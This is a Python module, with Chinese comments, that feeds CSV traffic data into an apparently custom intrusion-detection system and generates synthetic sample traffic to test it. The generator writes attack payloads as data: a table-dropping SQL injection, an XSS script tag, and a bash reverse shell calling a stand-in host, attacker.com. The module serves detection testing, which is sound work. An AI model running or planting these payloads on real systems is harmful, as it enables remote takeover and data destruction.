"""
CSV Data Import and Analysis Module
把 CSV 流量數據整合到 C45144lAI 防禦系統
"""

import pandas as pd
import numpy as np
from pathlib import Path
from src.defense_system import LurRenJiaDefenseSystem
from typing import Tuple, List, Dict

class TrafficDataProcessor:
    """處理 CSV 流量數據並與防禦系統整合"""
    
    def __init__(self, csv_file: str):
        """
        初始化數據處理器
        
        Args:
            csv_file: CSV 文件路徑
        """
        self.csv_file = csv_file
        self.data = None
        self.processed_data = None
    
    def load_csv(self) -> pd.DataFrame:
        """
        加載 CSV 文件
        
        Returns:
            Pandas DataFrame
        """
        if not Path(self.csv_file).exists():
            raise FileNotFoundError(f"CSV 文件不存在: {self.csv_file}")
        
        self.data = pd.read_csv(self.csv_file)
        print(f"✅ 成功加載 CSV 文件: {self.csv_file}")
        print(f"   📊 行數: {len(self.data)}")
        print(f"   📋 列數: {len(self.data.columns)}")
        print(f"   🏷️  列名: {', '.join(self.data.columns)}")
        return self.data
    
    def extract_features(self, packet_size_col: str = 'packet_size', 
                        request_rate_col: str = 'request_rate') -> np.ndarray:
        """
        提取特徵列
        
        Args:
            packet_size_col: 封包大小列名
            request_rate_col: 請求速率列名
            
        Returns:
            特徵 numpy 陣列 (N x 2)
        """
        if self.data is None:
            raise ValueError("需要先加載 CSV 文件")
        
        required_cols = [packet_size_col, request_rate_col]
        missing_cols = [col for col in required_cols if col not in self.data.columns]
        
        if missing_cols:
            raise ValueError(f"缺少列: {missing_cols}")
        
        features = self.data[[packet_size_col, request_rate_col]].values
        print(f"✅ 特徵提取完成")
        print(f"   📊 特徵形狀: {features.shape}")
        print(f"   🔢 特徵範圍: [{features.min():.2f}, {features.max():.2f}]")
        
        return features
    
    def get_statistics(self) -> Dict:
        """獲取數據統計信息"""
        if self.data is None:
            raise ValueError("需要先加載 CSV 文件")
        
        return {
            'total_rows': len(self.data),
            'total_columns': len(self.data.columns),
            'column_names': list(self.data.columns),
            'data_types': dict(self.data.dtypes),
            'missing_values': dict(self.data.isnull().sum()),
            'numeric_summary': self.data.describe().to_dict()
        }
    
    def validate_data(self) -> bool:
        """驗證數據完整性"""
        if self.data is None:
            raise ValueError("需要先加載 CSV 文件")
        
        # 檢查空值
        missing = self.data.isnull().sum()
        if missing.any():
            print(f"⚠️  發現缺失值: {missing[missing > 0].to_dict()}")
            return False
        
        print("✅ 數據驗證通過")
        return True


class CSVTrafficAnalyzer:
    """使用 CSV 數據進行流量分析"""
    
    def __init__(self):
        """初始化分析器"""
        self.system = LurRenJiaDefenseSystem()
        self.results = []
    
    def analyze_csv_traffic(self, csv_file: str, 
                          ip_col: str = 'source_ip',
                          payload_col: str = 'payload',
                          packet_size_col: str = 'packet_size',
                          request_rate_col: str = 'request_rate') -> List[Dict]:
        """
        分析 CSV 中的流量數據
        
        Args:
            csv_file: CSV 文件路徑
            ip_col: IP 地址列名
            payload_col: 載荷列名
            packet_size_col: 封包大小列名
            request_rate_col: 請求速率列名
            
        Returns:
            分析結果列表
        """
        # 加載和驗證數據
        processor = TrafficDataProcessor(csv_file)
        data = processor.load_csv()
        processor.validate_data()
        
        # 提取特徵進行訓練
        print("\n🔧 訓練 AI 基線模型...")
        features = processor.extract_features(packet_size_col, request_rate_col)
        
        # 使用正常流量訓練
        normal_features = features[:max(1, len(features)//2)]  # 前半部分作為正常
        self.system.train_ai_baseline(normal_features)
        
        # 分析所有流量
        print("\n🔍 分析流量...")
        results = []
        
        for idx, row in data.iterrows():
            ip = str(row.get(ip_col, 'UNKNOWN'))
            payload = str(row.get(payload_col, ''))
            
            # 提取特徵
            packet_size = float(row.get(packet_size_col, 50))
            request_rate = float(row.get(request_rate_col, 15))
            
            # 分析
            result = self.system.analyze_incoming_traffic(
                ip, 
                payload, 
                np.array([packet_size, request_rate])
            )
            
            # 添加原始數據
            result['row_index'] = idx
            for col in data.columns:
                if col not in result:
                    result[f'csv_{col}'] = row[col]
            
            results.append(result)
        
        self.results = results
        return results
    
    def get_summary(self) -> Dict:
        """獲取分析摘要"""
        if not self.results:
            return None
        
        total = len(self.results)
        blocked = sum(1 for r in self.results if r['action'] == 'blocked')
        allowed = sum(1 for r in self.results if r['action'] == 'allowed')
        
        threat_types = {}
        for result in self.results:
            threat = result['threat_type']
            threat_types[threat] = threat_types.get(threat, 0) + 1
        
        return {
            'total_analyzed': total,
            'blocked': blocked,
            'allowed': allowed,
            'block_rate': blocked / total if total > 0 else 0,
            'threat_distribution': threat_types,
            'stats': self.system.get_statistics()
        }
    
    def export_results_csv(self, output_file: str = 'analysis_results.csv'):
        """
        導出分析結果到 CSV
        
        Args:
            output_file: 輸出文件名
        """
        if not self.results:
            raise ValueError("沒有分析結果可導出")
        
        df = pd.DataFrame(self.results)
        df.to_csv(output_file, index=False, encoding='utf-8')
        print(f"✅ 結果已導出至: {output_file}")
        print(f"   📊 行數: {len(df)}")
        print(f"   📋 列數: {len(df.columns)}")


def generate_sample_traffic_csv(filename: str = 'sample_traffic_data.csv', num_records: int = 50):
    """
    生成示例流量 CSV 文件
    
    Args:
        filename: 輸出文件名
        num_records: 記錄數量
    """
    print(f"📝 生成示例 CSV 文件: {filename}")
    
    np.random.seed(42)
    
    # 生成混合流量 (正常 + 攻擊)
    data = []
    
    # 正常流量 (60%)
    normal_count = int(num_records * 0.6)
    for i in range(normal_count):
        data.append({
            'source_ip': f'192.168.1.{np.random.randint(1, 255)}',
            'payload': f'GET /api/data_{i}',
            'packet_size': np.random.normal(50, 5),
            'request_rate': np.random.normal(15, 3),
            'timestamp': pd.Timestamp.now() + pd.Timedelta(seconds=i*10)
        })
    
    # SQL 注入攻擊 (10%)
    sqli_count = int(num_records * 0.1)
    for i in range(sqli_count):
        data.append({
            'source_ip': f'203.0.113.{np.random.randint(1, 255)}',
            'payload': f"'; DROP TABLE users; -- {i}",
            'packet_size': np.random.normal(55, 5),
            'request_rate': np.random.normal(18, 2),
            'timestamp': pd.Timestamp.now() + pd.Timedelta(seconds=(normal_count + i)*10)
        })
    
    # XSS 攻擊 (10%)
    xss_count = int(num_records * 0.1)
    for i in range(xss_count):
        data.append({
            'source_ip': f'10.0.0.{np.random.randint(1, 255)}',
            'payload': f"<script>alert('XSS_{i}')</script>",
            'packet_size': np.random.normal(48, 5),
            'request_rate': np.random.normal(12, 3),
            'timestamp': pd.Timestamp.now() + pd.Timedelta(seconds=(normal_count + sqli_count + i)*10)
        })
    
    # RCE 攻擊 (10%)
    rce_count = int(num_records * 0.1)
    for i in range(rce_count):
        data.append({
            'source_ip': f'45.33.2.{np.random.randint(1, 255)}',
            'payload': f"bash -i >& /dev/tcp/attacker.com/4444_{i} 0>&1",
            'packet_size': np.random.normal(52, 4),
            'request_rate': np.random.normal(20, 2),
            'timestamp': pd.Timestamp.now() + pd.Timedelta(seconds=(normal_count + sqli_count + xss_count + i)*10)
        })
    
    # 創建 DataFrame 並保存
    df = pd.DataFrame(data)
    df.to_csv(filename, index=False, encoding='utf-8')
    
    print(f"✅ CSV 文件已生成")
    print(f"   📊 總記錄數: {len(df)}")
    print(f"   🟢 正常流量: {normal_count} ({normal_count/num_records*100:.0f}%)")
    print(f"   🔴 SQL 注入: {sqli_count} ({sqli_count/num_records*100:.0f}%)")
    print(f"   🔴 XSS 攻擊: {xss_count} ({xss_count/num_records*100:.0f}%)")
    print(f"   🔴 RCE 攻擊: {rce_count} ({rce_count/num_records*100:.0f}%)")
    print()
    
    return df


if __name__ == "__main__":
    # 生成示例數據
    print("=" * 80)
    print("📊 CSV 流量數據集成演示")
    print("=" * 80)
    print()
    
    # 生成示例 CSV
    sample_file = 'sample_traffic_data.csv'
    df_sample = generate_sample_traffic_csv(sample_file, num_records=50)
    
    # 顯示 CSV 內容預覽
    print("📋 CSV 文件預覽:")
    print(df_sample.head(10))
    print()
    
    # 創建分析器
    print("=" * 80)
    print("🔍 開始流量分析")
    print("=" * 80)
    print()
    
    analyzer = CSVTrafficAnalyzer()
    results = analyzer.analyze_csv_traffic(
        sample_file,
        ip_col='source_ip',
        payload_col='payload',
        packet_size_col='packet_size',
        request_rate_col='request_rate'
    )
    
    # 顯示摘要
    print("\n" + "=" * 80)
    print("📊 分析摘要")
    print("=" * 80)
    print()
    
    summary = analyzer.get_summary()
    print(f"✅ 總分析數: {summary['total_analyzed']}")
    print(f"🚫 被阻止: {summary['blocked']} ({summary['block_rate']:.1%})")
    print(f"✔️  允許: {summary['allowed']}")
    print()
    
    print("⚠️  威脅類型分布:")
    for threat_type, count in sorted(summary['threat_distribution'].items(), key=lambda x: x[1], reverse=True):
        bar = "█" * count + "░" * (20 - count)
        print(f"  {threat_type:20s} {bar} ({count})")
    print()
    
    # 導出結果
    analyzer.export_results_csv('analysis_results.csv')
    
    # 顯示高危事件
    print("=" * 80)
    print("🚨 高危事件 (風險分數 > 80%)")
    print("=" * 80)
    print()
    
    high_risk = [r for r in results if r['risk_score'] > 0.8]
    for i, result in enumerate(high_risk[:5], 1):
        print(f"事件 #{i}:")
        print(f"  🌐 來源 IP: {result['ip']}")
        print(f"  ⚠️  威脅類型: {result['threat_type']}")
        print(f"  📊 風險分數: {result['risk_score']:.1%}")
        print(f"  📄 載荷: {result['payload'][:80]}...")
        print()
    
    print("=" * 80)
    print("✅ CSV 流量分析完成")
    print("=" * 80)
